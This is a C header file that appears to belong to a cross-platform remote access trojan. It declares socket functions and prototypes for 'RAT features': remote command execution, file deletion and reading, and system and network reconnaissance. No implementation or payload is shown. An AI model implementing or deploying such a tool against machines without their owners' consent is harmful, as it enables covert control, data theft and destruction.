/* includes? */

/* Common Interface for windows.c and linux.c */

/* Preprocessor conditionals to specify abstract return type based on platform */
#if _WIN32
    #include <winsock2.h>
    typedef SOCKET Hndl;

#elif __linux__
    typedef int Hndl;

#endif

/* Function prototypes for socket IO */
Hndl create_socket(const char *host, int port);
int bind_socket(int port, Hndl sockfd);
int listen_socket(int max_connections, Hndl sockfd);
Hndl accept_socket(Hndl sockfd, int port);
int read_socket(Hndl sockfd, char buffer[], int len);

/* Function prototypes for RAT features */
void run_command(Hndl sockfd, const char *argument);
void delete_file(Hndl sockfd, const char *argument);
void system_info(Hndl sockfd);
void networking_info(Hndl sockfd);
void read_file(Hndl sockfd, const char *filepath);

const char *parse_feature(char input[]);
const char *parse_argument(char input[]);
